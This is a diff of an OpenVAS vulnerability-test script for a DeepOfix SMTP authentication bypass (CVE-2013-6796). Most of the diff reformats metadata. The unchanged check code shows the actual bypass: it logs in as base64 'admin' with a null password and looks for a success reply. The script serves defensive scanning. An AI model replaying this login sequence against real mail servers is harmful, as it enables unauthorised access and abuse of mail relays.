@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_deepOfix_auth_bypass_11_13.nasl 6104 2017-05-11 09:03:48Z teissa $
+# $Id: gb_deepOfix_auth_bypass_11_13.nasl 11096 2018-08-23 12:49:10Z mmartin $
 #
 # DeepOfix SMTP Authentication Bypass
 #
@@ -25,56 +25,43 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103833";
-
-tag_insight = "The vulnerability allows an attacker to bypass the authentication in the SMTP server
-to send emails. The problem is that the SMTP server performs authentication against 
-LDAP by default, and the service does not check that the password is null if this 
-Base64. This creates a connection 'anonymous' but with a user account without entering
-the password.";
-
-tag_impact = "An Attacker could login in the SMTP server knowing only the username of one user in the
-server and he could sends emails. One important thing is that the user 'admin' always 
-exists in the server.";
-
-tag_affected = "DeepOfix 3.3 and below are vulnerable.";
-
-tag_summary = "DeepOfix versions 3.3 and below suffer from an SMTP server authentication
-bypass vulnerability due to an LDAP issue.";
-
-tag_solution = "Ask the vendor for an Update or disable 'anonymous LDAP
-bind' in your LDAP server.";
-
-tag_vuldetect = "Try to bypass authentication for the user 'admin'";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_cve_id("CVE-2013-6796");
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
- script_version ("$Revision: 6104 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.103833");
+  script_cve_id("CVE-2013-6796");
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
+  script_version("$Revision: 11096 $");
 
- script_name("DeepOfix SMTP Authentication Bypass");
+  script_name("DeepOfix SMTP Authentication Bypass");
 
 
- script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124054/DeepOfix-3.3-SMTP-Authentication-Bypass.html");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-05-11 11:03:48 +0200 (Thu, 11 May 2017) $");
- script_tag(name:"creation_date", value:"2013-11-19 15:05:15 +0100 (Tue, 19 Nov 2013)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("SMTP problems");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
- script_require_ports("Services/smtp", 25);
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124054/DeepOfix-3.3-SMTP-Authentication-Bypass.html");
 
- script_tag(name : "impact" , value : tag_impact);
- script_tag(name : "vuldetect" , value : tag_vuldetect);
- script_tag(name : "insight" , value : tag_insight);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_tag(name : "affected" , value : tag_affected);
+  script_tag(name:"last_modification", value:"$Date: 2018-08-23 14:49:10 +0200 (Thu, 23 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2013-11-19 15:05:15 +0100 (Tue, 19 Nov 2013)");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("SMTP problems");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
+  script_require_ports("Services/smtp", 25);
+
+  script_tag(name:"impact", value:"An Attacker could login in the SMTP server knowing only the username of one user in the
+server and he could sends emails. One important thing is that the user 'admin' always
+exists in the server.");
+  script_tag(name:"vuldetect", value:"Try to bypass authentication for the user 'admin'");
+  script_tag(name:"insight", value:"The vulnerability allows an attacker to bypass the authentication in the SMTP server
+to send emails. The problem is that the SMTP server performs authentication against
+LDAP by default, and the service does not check that the password is null if this
+Base64. This creates a connection 'anonymous' but with a user account without entering
+the password.");
+  script_tag(name:"solution", value:"Ask the vendor for an Update or disable 'anonymous LDAP
+bind' in your LDAP server.");
+  script_tag(name:"solution_type", value:"Mitigation");
+  script_tag(name:"summary", value:"DeepOfix versions 3.3 and below suffer from an SMTP server authentication
+bypass vulnerability due to an LDAP issue.");
+  script_tag(name:"affected", value:"DeepOfix 3.3 and below are vulnerable.");
 
  exit(0);
 }
@@ -95,23 +82,23 @@ if(!domain)domain = 'example.org';
 
 soc = smtp_open(port: port, helo: NULL);
 if(!soc)exit(0);
- 
+
 src_name = this_host_name();
 
 send(socket: soc, data: strcat('EHLO ', src_name, '\r\n'));
 buf = smtp_recv_line(socket: soc);
 
 if("250" >!< buf) {
-  smtp_close(socket: soc); 
-  exit(0);  
-}  
+  smtp_close(socket: soc);
+  exit(0);
+}
 
 send(socket: soc, data:'auth login\r\n');
 buf = smtp_recv_line(socket: soc);
 
 if("334 VXNlcm5hbWU6" >!< buf) { # username:
   smtp_close(socket: soc);
-  exit(0);  
+  exit(0);
 }
 
 send(socket: soc, data:'YWRtaW4=\r\n'); # admin
@@ -119,7 +106,7 @@ buf = smtp_recv_line(socket: soc);
 
 if("334 UGFzc3dvcmQ6" >!< buf) { # password:
   smtp_close(socket: soc);
-  exit(0);    
+  exit(0);
 }
 
 send(socket: soc, data:'AA==\r\n'); # \0
@@ -129,7 +116,7 @@ smtp_close(socket: soc);
 if("235 nice to meet you" >< buf) {
   security_message(port:port);
   exit(0);
-}  
+}
 
 exit(0);
 
